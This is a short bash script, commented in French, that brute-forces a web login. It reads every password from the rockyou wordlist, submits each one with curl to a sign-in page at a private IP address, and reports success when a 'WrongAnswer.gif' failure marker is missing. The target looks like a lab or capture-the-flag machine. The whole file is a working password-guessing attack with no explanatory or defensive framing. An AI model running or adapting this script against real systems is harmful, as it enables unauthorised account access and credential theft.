#!/bin/bash

username="${1}"
url="http://10.11.249.0/"
password_file="/usr/share/wordlists/rockyou.txt.gz"
failure_indicator="images/WrongAnswer.gif"

temp_password_file=$(mktemp)

echo "[INFO] Tentatives de connexion avec l'utilisateur: $username"

gzip -d -c "$password_file" > "$temp_password_file"

while IFS= read -r password; do
    response=$(curl -s -G -d "page=signin" -d "username=$username" -d "password=$password" -d "Login=Login" "$url")

    if echo "$response" | grep -q "$failure_indicator"; then
        echo "[INFO] Tentative échouée pour le mot de passe: $password"
    else
        echo "[SUCCESS] Mot de passe trouvé pour $username: $password"
        rm -f "$temp_password_file"
        exit 0 
    fi
done < "$temp_password_file"

rm -f "$temp_password_file"
echo "[INFO] Aucun mot de passe valide trouvé dans le fichier de mots de passe."
